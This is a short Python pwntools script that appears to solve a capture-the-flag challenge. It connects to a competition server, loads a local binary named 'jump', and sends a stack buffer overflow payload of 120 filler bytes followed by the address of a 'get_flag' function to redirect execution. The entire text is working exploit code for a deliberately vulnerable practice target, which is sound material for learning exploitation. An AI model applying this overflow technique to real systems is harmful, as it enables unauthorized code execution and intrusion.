from pwn import *
r = remote('pwn.utctf.live', 5001)
r.recvuntil('drill')
e = elf.ELF('./jump')
payload = b'a'*120 + p64(e.symbols['get_flag']) + b'\n'
r.sendline(payload)
r.interactive()

